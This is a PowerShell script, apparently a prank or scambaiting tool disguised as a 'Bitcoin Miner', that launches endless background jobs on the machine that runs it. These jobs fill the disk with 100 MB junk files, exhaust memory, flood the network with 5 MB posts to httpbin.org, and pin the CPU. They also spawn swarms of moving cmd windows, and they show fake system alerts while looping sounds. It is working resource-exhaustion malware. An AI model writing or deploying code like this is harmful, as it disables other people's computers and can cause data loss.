

function Bitcoin-Warning {    
    
    Start-Job -ScriptBlock {
        while ($true) {
            $SoundPlayer = New-Object System.Media.SoundPlayer
            $SoundPlayer.SoundLocation = "C:\ShellyPrograms\Bitcoin Miner\Assets\XP error.wav"
            $SoundPlayer.Play()
            start-sleep -Milliseconds 300
            add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show("Bitcoin servers are currently disabled on this device", "System Alert", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::None)
        }
    }
}


function Lag-Machine {
        while ($true) { }
}

function Memory {
    start-job -scriptblock {
        $junk = @()
        $block = "X" * 52428800  # 50 MB block
        1..1000 | ForEach-Object -Parallel {
            $global:junk += $using:block
        }
        
    }
}

function Disk {
    start-job -scriptblock {
        $block = '0' * 104857600  # 100 MB
        while ($true) {
            $file = "$env:TEMP\junk_$([guid]::NewGuid()).bin"
            [System.IO.File]::WriteAllText($file, $block)
        }
        
    }    
}

function network {
    start-job -scriptblock {
        Add-Type -AssemblyName System.Net.Http
        $client = [System.Net.Http.HttpClient]::new()
        $data = [System.Text.Encoding]::UTF8.GetBytes("Z" * 5242880)  # 5 MB
        
        while ($true) {
            $content = [System.Net.Http.ByteArrayContent]::new($data)
            $client.PostAsync("https://httpbin.org/post", $content) | Out-Null
        }
        
    }
}

function XP-error {
    Start-Job -ScriptBlock {    
        $SoundPlayer = New-Object System.Media.SoundPlayer
        $SoundPlayer.SoundLocation = "C:\ShellyPrograms\Bitcoin Miner\Assets\XP error.wav"
        $SoundPlayer.Play()  # Asynchronous playback
    }
}
function Basic-Rage {
    Start-Job -ScriptBlock { 
        while ($true) {   
            $SoundPlayer = New-Object System.Media.SoundPlayer
            $SoundPlayer.SoundLocation = "C:\ShellyPrograms\Bitcoin Miner\Assets\Basic Rage.wav"
            $SoundPlayer.Play()  # Asynchronous playback
            Start-Sleep -Seconds 120
        }
    }
}


function DONT-REDEEM-THE-CARDS {
    Start-Job -ScriptBlock {    
        while ($true) {
            $SoundPlayer = New-Object System.Media.SoundPlayer
            $SoundPlayer.SoundLocation = "C:\ShellyPrograms\Bitcoin Miner\Assets\Dont redeem cards.wav"
            $SoundPlayer.Play()  # Asynchronous playback
            Start-sleep -seconds 47
        }
    }
}

function spam-cmd {
    Start-Job -ScriptBlock {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Window {
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
}
"@
    
        while ($true) {
            $randomX = Get-Random -Minimum 0 -Maximum 1800
            $randomY = Get-Random -Minimum 0 -Maximum 800
    
            $cmdCommand = 'mode con: cols=50 lines=20 & timeout /t 2 >nul & exit'
            $process = Start-Process cmd -ArgumentList "/k $cmdCommand" -PassThru
            Start-Sleep -Milliseconds 300
    
            $hwnd = (Get-Process -Id $process.Id).MainWindowHandle
            if ($hwnd -ne 0) {
                [Window]::MoveWindow($hwnd, $randomX, $randomY, 400, 300, $true)
            }
        }
    }
}



Basic-Rage
DONT-REDEEM-THE-CARDS
spam-cmd
spam-cmd
spam-cmd
spam-cmd
spam-cmd
spam-cmd
Disk
Memory
network
Bitcoin-Warning
while ($true) {
    Start-Sleep -Seconds 10
    Lag-Machine
    Bitcoin-Warning
    spam-cmd
    Start-Sleep -Seconds 10
    Basic-Rage
    DONT-REDEEM-THE-CARDS
}
